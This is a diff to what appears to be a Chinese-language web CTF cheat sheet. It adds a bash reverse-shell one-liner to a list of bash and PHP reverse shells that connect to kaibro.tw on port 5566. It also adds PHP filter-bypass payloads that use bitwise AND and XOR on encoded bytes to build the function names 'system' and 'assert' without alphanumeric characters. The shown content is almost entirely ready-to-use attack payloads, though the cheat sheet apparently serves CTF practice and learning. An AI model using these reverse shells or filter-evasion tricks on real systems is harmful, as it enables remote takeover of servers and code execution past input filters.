@@ -158,6 +158,7 @@ A=fl;B=ag;cat $A$B
 - Bash
     - `bash -i >& /dev/tcp/kaibro.tw/5566 0>&1`
     - `bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`
+    - `0<&196;exec 196<>/dev/tcp/kaibro.tw/5566; sh <&196 >&196 2>&196`
 
 - PHP
     - `php -r '$sock=fsockopen("kaibro.tw",5566);exec("/bin/sh -i <&3 >&3 2>&3");'`
@@ -455,6 +456,20 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
         - `chr(259) === chr(3)`
         - `chr(-87) === chr(169)`
 
+- 遞增
+    - `$a="9D9"; var_dump(++$a);`
+        - `string(3) "9E0"`
+    - `$a="9E0"; var_dump(++$a);`
+        - `float(10)`
+
+- 算數運算繞Filter
+    - `%f3%f9%f3%f4%e5%ed & %7f%7f%7f%7f%7f%7f`
+        - `system`
+        - 可用在限制不能出現英數字時 or 過濾某些特殊符號
+    - ```$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');```
+        - `assert`
+    - 其他
+        - `~`, `++`等運算，也都可用類似概念構造
 
 # Command Injection
 
